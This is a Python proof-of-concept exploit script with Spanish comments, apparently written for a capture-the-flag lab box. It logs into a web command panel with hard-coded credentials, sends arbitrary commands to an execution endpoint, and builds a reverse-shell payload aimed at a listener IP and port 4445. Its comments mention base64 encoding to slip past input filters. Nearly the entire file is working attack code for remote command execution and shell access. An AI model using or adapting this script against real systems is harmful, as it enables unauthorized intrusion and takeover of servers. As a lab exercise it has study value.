import requests as re
import payload as pa # Esto permite usar la funcion que contiene la carga maliciosa
import base64 # Imporamos esta libreria para realizar el encoding y pasar los filtros

# Se inicia la variable sesion para guardar las cookies
sesion = re.Session()

# Defino las constantes del PoC de requests + session
LOGIN_ENDPOINT = 'http://10.128.167.86/login.php'
CREDENCIALES = {
    'username' : 'R1ckRul3s',
    'password' : 'Wubbalubbadubdub',
    'sub' : 'Login'
}

# Defino el ednpoint donde se va a mandar el payload
RCE_ENDPOINT = 'http://10.128.167.86/portal.php'

# Defino las constantes de IP y Puerto para la ejecucion de la llamada y poder recibirla posteriormente
IP_HOST = '192.168.132.194'
PORT_LISTENER = 4445

# En esta funcion se define la ejecucion remota del payload para recibir la llamada desde el server
def ejecutar_comandos(payload):
    PAYLOAD_RSHELL = {
        'command' : payload,
        'sub': 'Execute'
    }

    # Mandamos el payload al servidor
    rce_respuesta = sesion.post(RCE_ENDPOINT, data = PAYLOAD_RSHELL)
    
    if rce_respuesta.status_code == 200:
        # Se intenta limpiar la salida y asi comprobar si hubo o no respuesta
        try:
            return rce_respuesta.text.split('<pre>')[1].split('</pre>')[0].strip()
        except IndexError:
            return "[!] Comando sin salida o bloqueado."
    else:
        return f"[!] Error HTTP: {rce_respuesta.status_code}"

# Ahora hay que acceder con el metodo POST (Endpoint + credenciales)
estado_login = sesion.post(LOGIN_ENDPOINT, data = CREDENCIALES)

# Se anaden las siguientes comprobaciones para verificar el resultado
if estado_login.status_code == 200:
    print('Peticion de login enviada. Verificando...')
    if 'Command Panel' in estado_login.text:
        print(f'Login exitoso! Mostrando las cookies de sesion: {sesion.cookies}')
        # Tras el login exitoso vamos a decirle a la maquina que nos llame direcamente (reverse shell)
        print('-' * 50)
        print("REALIZANDO REVERSE SHELL --> COGIENDO LLAMADA P4445 (Listener)")
        print('-' * 50)
        # Realizo una llamada a la funcion importada de payload as pa (reverse_shell(ip, puerto))
        payload_raw = pa.reverse_shell(IP_HOST, PORT_LISTENER)
        print(payload_raw)
    else:
        print('Login fallido!')
else:
    print('Error de conexion!')
